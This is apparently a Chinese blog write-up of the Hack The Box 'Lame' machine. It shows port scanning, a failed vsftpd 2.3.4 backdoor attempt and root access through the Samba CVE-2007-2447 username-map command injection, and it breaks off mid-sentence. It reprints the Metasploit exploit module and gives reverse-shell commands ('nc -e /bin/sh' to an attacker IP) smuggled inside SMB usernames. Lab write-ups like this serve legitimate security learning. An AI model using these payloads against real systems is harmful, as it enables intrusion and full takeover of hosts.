<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="描述"><title>HTB中对Lame靶机的全路径渗透 | 知识证明</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><meta name="generator" content="Hexo 5.4.2"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">HTB中对Lame靶机的全路径渗透</h1><a id="logo" href="/.">知识证明</a><p class="description">卷不动，躺不平，一门心思，只想搞钱...</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/about-me/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">HTB中对Lame靶机的全路径渗透</h1><div class="post-meta">2022-08-31</div><div class="post-content"><p>这台机器的渗透路径如下所示：</p>
<p><img src="https://gaoxiaodiao.com/wp-content/uploads/2022/08/image-1661959009480.png" alt="file"></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先对其进行端口扫描，发现有5个开放的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">nmap -sCV -p- 10.10.10.3</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.10.3</span><br><span class="line">Host is up (0.0023s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.3.4</span><br><span class="line">_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line"> ftp-syst: </span><br><span class="line">   STAT: </span><br><span class="line"> FTP server status:</span><br><span class="line">      Connected to 10.10.16.10</span><br><span class="line">      Logged in as ftp</span><br><span class="line">      TYPE: ASCII</span><br><span class="line">      No session bandwidth limit</span><br><span class="line">      Session timeout in seconds is 300</span><br><span class="line">      Control connection is plain text</span><br><span class="line">      Data connections will be plain text</span><br><span class="line">      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line"> ssh-hostkey: </span><br><span class="line">   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">3632/tcp open  distccd</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"> smb-os-discovery: </span><br><span class="line">   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">   Computer name: lame</span><br><span class="line">   NetBIOS computer name: </span><br><span class="line">   Domain name: hackthebox.gr</span><br><span class="line">   FQDN: lame.hackthebox.gr</span><br><span class="line">_  System time: 2022-08-24T02:00:19-04:00</span><br><span class="line"> smb-security-mode: </span><br><span class="line">   account_used: guest</span><br><span class="line">   authentication_level: user</span><br><span class="line">   challenge_response: supported</span><br><span class="line">_  message_signing: disabled (dangerous, but default)</span><br><span class="line">_clock-skew: mean: 2h00m20s, deviation: 2h49m44s, median: 18s</span><br></pre></td></tr></table></figure>

<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>虽然FTP允许匿名登录，但分享的目录是空的。</p>
<p><code>vsftpd 2.3.4</code>是一个非常著名存在后门的FTP服务程序，即使我们并不知道这一点，但也可以通过<code>searchsploit</code>工具来查看这个版本的<code>vsftpd</code>存在可以利用的点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali# searchsploit vsftpd 2.3.4</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                     Path</span><br><span class="line">                                                                  (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)            exploits/unix/remote/17491.rb</span><br><span class="line">----------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<h3 id="不使用Metasploit对VSFTPD进行利用"><a href="#不使用Metasploit对VSFTPD进行利用" class="headerlink" title="不使用Metasploit对VSFTPD进行利用"></a>不使用Metasploit对VSFTPD进行利用</h3><p>在登录FTP时，当你的用户名以<code>:)</code>结尾时，<code>vsftpd</code>会监听<code>6200</code>端口并且返回一个shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali# nc 10.10.10.3 21</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">USER gaoxiaodiao:)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">PASS not-a-password </span><br></pre></td></tr></table></figure>

<p>正常情况下，我应该可以连到<code>Lame</code>靶机的<code>6200</code>端口并且获得一个shell，但实际上，当我去尝试去连接该端口时，并没有成功。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali# nc 10.10.10.3 6200</span><br><span class="line">Ncat: TIMEOUT.</span><br></pre></td></tr></table></figure>

<h3 id="使用Metasploit对VSFTPD进行利用"><a href="#使用Metasploit对VSFTPD进行利用" class="headerlink" title="使用Metasploit对VSFTPD进行利用"></a>使用Metasploit对VSFTPD进行利用</h3><p>使用<code>Metasploit</code>对后门进行利用和上述提到的方式没什么不同，但我还是会演示一下，启动<code>msfconsole</code>，然后查找：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                  Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br></pre></td></tr></table></figure>

<p>接下来使用这个脚本，设置目标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS                   yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.3</span><br><span class="line">rhosts =&gt; 10.10.10.3</span><br></pre></td></tr></table></figure>

<p>设置Payload为<code>cmd/unix/interact</code>，然后执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set payload cmd/unix/interact </span><br><span class="line">payload =&gt; cmd/unix/interact</span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/vsftpd_234_backdoor):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/interact):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 10.10.10.3:21 - USER: 331 Please specify the password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>

<p>仍然失败了，后文我将会探索其失败的原因。</p>
<h2 id="SAMBA利用"><a href="#SAMBA利用" class="headerlink" title="SAMBA利用"></a>SAMBA利用</h2><h3 id="手工完成"><a href="#手工完成" class="headerlink" title="手工完成"></a>手工完成</h3><p>为了去理解到底发生了什么，我将会分析利用脚本的源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali# searchsploit -m exploits/unix/remote/16320.rb</span><br><span class="line">  Exploit: Samba 3.0.20 &lt; 3.0.25rc3 - &#x27;Username&#x27; map script&#x27; Command Execution (Metasploit)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/16320</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb</span><br><span class="line">File Type: Ruby script, ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/hackthebox/forwardslash-10.10.10.183/16320.rb</span><br></pre></td></tr></table></figure>

<p>这段代码非常短：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line"># $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">##</span><br><span class="line"># This file is part of the Metasploit Framework and may be subject to</span><br><span class="line"># redistribution and commercial restrictions. Please see the Metasploit</span><br><span class="line"># Framework web site for more information on licensing and terms of use.</span><br><span class="line"># http://metasploit.com/framework/</span><br><span class="line">##</span><br><span class="line"></span><br><span class="line">require &#x27;msf/core&#x27;</span><br><span class="line"></span><br><span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span><br><span class="line">        Rank = ExcellentRanking</span><br><span class="line"></span><br><span class="line">        include Msf::Exploit::Remote::SMB</span><br><span class="line"></span><br><span class="line">        # For our customized version of session_setup_ntlmv1</span><br><span class="line">        CONST = Rex::Proto::SMB::Constants</span><br><span class="line">        CRYPT = Rex::Proto::SMB::Crypt</span><br><span class="line"></span><br><span class="line">        def initialize(info = &#123;&#125;)</span><br><span class="line">                super(update_info(info,</span><br><span class="line">                        &#x27;Name&#x27;           =&gt; &#x27;Samba &quot;username map script&quot; Command Execution&#x27;,</span><br><span class="line">                        &#x27;Description&#x27;    =&gt; %q&#123;</span><br><span class="line">                                        This module exploits a command execution vulnerability in Samba</span><br><span class="line">                                versions 3.0.20 through 3.0.25rc3 when using the non-default</span><br><span class="line">                                &quot;username map script&quot; configuration option. By specifying a username</span><br><span class="line">                                containing shell meta characters, attackers can execute arbitrary</span><br><span class="line">                                commands.</span><br><span class="line"></span><br><span class="line">                                No authentication is needed to exploit this vulnerability since</span><br><span class="line">                                this option is used to map usernames prior to authentication!</span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#x27;Author&#x27;         =&gt; [ &#x27;jduck&#x27; ],</span><br><span class="line">                        &#x27;License&#x27;        =&gt; MSF_LICENSE,</span><br><span class="line">                        &#x27;Version&#x27;        =&gt; &#x27;$Revision: 10040 $&#x27;,</span><br><span class="line">                        &#x27;References&#x27;     =&gt;</span><br><span class="line">                                [</span><br><span class="line">                                        [ &#x27;CVE&#x27;, &#x27;2007-2447&#x27; ],</span><br><span class="line">                                        [ &#x27;OSVDB&#x27;, &#x27;34700&#x27; ],</span><br><span class="line">                                        [ &#x27;BID&#x27;, &#x27;23972&#x27; ],</span><br><span class="line">                                        [ &#x27;URL&#x27;, &#x27;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534&#x27; ],</span><br><span class="line">                                        [ &#x27;URL&#x27;, &#x27;http://samba.org/samba/security/CVE-2007-2447.html&#x27; ]</span><br><span class="line">                                ],</span><br><span class="line">                        &#x27;Platform&#x27;       =&gt; [&#x27;unix&#x27;],</span><br><span class="line">                        &#x27;Arch&#x27;           =&gt; ARCH_CMD,</span><br><span class="line">                        &#x27;Privileged&#x27;     =&gt; true, # root or nobody user</span><br><span class="line">                        &#x27;Payload&#x27;        =&gt;</span><br><span class="line">                                &#123;</span><br><span class="line">                                        &#x27;Space&#x27;    =&gt; 1024,</span><br><span class="line">                                        &#x27;DisableNops&#x27; =&gt; true,</span><br><span class="line">                                        &#x27;Compat&#x27;      =&gt;</span><br><span class="line">                                                &#123;</span><br><span class="line">                                                        &#x27;PayloadType&#x27; =&gt; &#x27;cmd&#x27;,</span><br><span class="line">                                                        # *_perl and *_ruby work if they are installed</span><br><span class="line">                                                        # mileage may vary from system to system..</span><br><span class="line">                                                &#125;</span><br><span class="line">                                &#125;,</span><br><span class="line">                        &#x27;Targets&#x27;        =&gt;</span><br><span class="line">                                [</span><br><span class="line">                                        [ &quot;Automatic&quot;, &#123; &#125; ]</span><br><span class="line">                                ],</span><br><span class="line">                        &#x27;DefaultTarget&#x27;  =&gt; 0,</span><br><span class="line">                        &#x27;DisclosureDate&#x27; =&gt; &#x27;May 14 2007&#x27;))</span><br><span class="line"></span><br><span class="line">                register_options(</span><br><span class="line">                        [</span><br><span class="line">                                Opt::RPORT(139)</span><br><span class="line">                        ], self.class)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">        def exploit</span><br><span class="line"></span><br><span class="line">                connect</span><br><span class="line"></span><br><span class="line">                # lol?</span><br><span class="line">                username = &quot;/=`nohup &quot; + payload.encoded + &quot;`&quot;</span><br><span class="line">                begin</span><br><span class="line">                        simple.client.negotiate(false)</span><br><span class="line">                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore[&#x27;SMBDomain&#x27;], false)</span><br><span class="line">                rescue ::Timeout::Error, XCEPT::LoginError</span><br><span class="line">                        # nothing, it either worked or it didn&#x27;t ;)</span><br><span class="line">                end</span><br><span class="line"></span><br><span class="line">                handler</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>最关键的部分在最底部的<code>def exploit</code>这里，它用以下参数创建了一个SMB的会话：</p>
<ul>
<li>  用户名：<code>/=\</code>nohup [payload]``</li>
<li>  密码：随机16字符</li>
<li>  域名/ip：用户提供的域名/ip</li>
</ul>
<p>在Linux上\<code>\</code>被用于执行并且把输出放在某个地方，就像<code>$()</code>一样。看起来Samba允许它发生在用户名里。<code>Metasploit</code>调用了<code>nohup</code>(在当前上下文环境外开启一个进程)去执行<code>payload</code>。</p>
<p>我会用<code>smbclient</code>工具来做到这点，首先，我会用<code>nc</code>工具监听在443端口，我可以通过<code>smbclient //10.10.10.3/tmp</code>来连接共享目录。</p>
<p>首先，我尝试指定一个用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali# smbclient //10.10.10.3/tmp -U &quot;./=`nohup nc -e /bin/sh 10.10.14.24 443`&quot;</span><br><span class="line">nohup: ignoring input and redirecting stderr to stdout</span><br></pre></td></tr></table></figure>

<p>在我监听的端口中，获得了一个shell连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali# nc -lnvp 443</span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br><span class="line">Ncat: Connection from 10.10.14.24.</span><br><span class="line">Ncat: Connection from 10.10.14.24:48532.</span><br></pre></td></tr></table></figure>

<p>不幸的是，在我本机执行时，我的<code>bash</code>在发送连接请求之前执行了\<code>\</code>里的内容，所以我用’来替换掉”：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali# smbclient //10.10.10.3/tmp -U &#x27;./=`nohup nc -e /bin/sh 10.10.14.24 443`&#x27;</span><br><span class="line">Enter =`NOHUP NC -E \bin/sh 10.10.14.24 443`&#x27;s password:</span><br></pre></td></tr></table></figure>

<p>由于一些原因，命令的开头变成了大写，这导致中断执行。</p>
<p>因此，需要换另一种方式使用<code>smbclient</code>里的<code>login</code>指令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; logon &quot;./=`nohup nc -e /bin/sh 10.10.14.24 443`&quot;</span><br><span class="line">Password: </span><br><span class="line">session setup failed: NT_STATUS_IO_TIMEOUT</span><br></pre></td></tr></table></figure>

<p>最终，我获得了Lame的一个root shell的连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali# nc -lnvp 443</span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br><span class="line">Ncat: Connection from 10.10.10.3.</span><br><span class="line">Ncat: Connection from 10.10.10.3:55410.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h3><p>在<a target="_blank" rel="noopener" href="https://github.com/amriunix/CVE-2007-2447">Gitub</a>的帮助下，我们也可以通过Python脚本来利用这个漏洞，根据安装的介绍执行这个脚本后，我也能很轻易就获得shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali# python usermap_script.py 10.10.10.3 139 10.10.14.24 443</span><br><span class="line">[*] CVE-2007-2447 - Samba usermap script</span><br><span class="line">[+] Connecting !</span><br><span class="line">[+] Payload was sent - check netcat !</span><br></pre></td></tr></table></figure>

<p>当然，我也获得了Lame的shell。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali# nc -lnvp 443</span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br><span class="line">Ncat: Connection from 10.10.10.3.</span><br><span class="line">Ncat: Connection from 10.10.10.3:44666.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>我也可以通过<code>Metasploit</code>来做到这点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/samba/usermap_script</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; set rhosts 10.10.10.3</span><br><span class="line">rhosts =&gt; 10.10.10.3</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; set payload cmd/unix/reverse</span><br><span class="line">payload =&gt; cmd/unix/reverse</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.14.24</span><br><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br></pre></td></tr></table></figure>

<p>接下来，我会检查一下option，确保所有的参数都没有问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/samba/usermap_script):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT   139              yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.24      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  443              yes       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure>

<p>当我执行完之后，它会提示我shell会话已经打开，直接在空白行执行命令即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/samba/usermap_script) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.10.14.24:443 </span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: echo zchdJVWjFG8sP3T3;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket B</span><br><span class="line">[*] B: &quot;zchdJVWjFG8sP3T3\r\n&quot;</span><br><span class="line">[*] Matching...</span><br><span class="line">[*] A is input...</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.24:443 -&gt; 10.10.10.3:37959) at 2019-02-28 08:52:31 -0500</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<p>不管以哪种方式拿到shell，我都会使用<code>python</code>的<code>pty</code>库来获取一个更舒服的shell：</p>
